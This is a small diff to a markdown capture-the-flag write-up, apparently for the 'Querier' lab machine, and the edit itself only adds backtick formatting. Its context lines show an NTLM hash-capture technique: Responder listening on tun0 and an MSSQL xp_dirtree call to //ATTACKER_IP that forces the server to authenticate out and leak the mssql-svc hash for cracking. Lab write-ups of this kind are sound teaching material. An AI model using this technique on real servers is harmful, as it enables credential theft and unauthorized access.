@@ -196,7 +196,7 @@ $ sudo Responder -I tun0
 SQL (QUERIER\reporting  reporting@volume)> xp_dirtree //ATTACKER_IP/doesnotexist/test
 ```
 
-After forcing an outbound connection to my server, we are granted a hash for the mssql-svc user. Usually these accounts will end with a $ indicating that they are machine accounts that have lengthy and complex passwords that are rotated every thirty days. Luckily, this SQL server was configured to run from this user and may be crackable.
+After forcing an outbound connection to my server, we are granted a hash for the mssql-svc user. Usually these accounts will end with a `$` indicating that they are machine accounts that have lengthy and complex passwords that are rotated every thirty days. Luckily, this SQL server was configured to run from this user and may be crackable.
 
 ![](../assets/img/2026-04-08-Querier/6.png)
 
